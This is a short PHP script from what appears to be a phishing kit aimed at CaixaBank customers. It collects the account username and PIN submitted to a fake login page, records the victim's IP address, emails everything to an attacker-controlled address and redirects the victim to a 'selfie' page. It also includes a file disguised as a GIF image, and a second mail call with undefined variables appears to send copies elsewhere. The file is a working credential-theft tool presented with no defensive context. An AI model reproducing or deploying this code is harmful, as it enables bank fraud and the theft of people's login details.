<?
include('arr.gif');
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Caixa Savage Details ReZulT-----------------------\n";
$message .= "   USER   : ".$_POST['account']."\n";
$message .= "   PIN    : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created BY END'09----------------\n";
$to = "youremail@gmail.com";
$subject = "USER CAIXA Complete Details";
$from = "From: Bull De Dog<User@Caxixa.com>";
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$from);

	   {
		   header("Location: selfie.html");

	   }

?>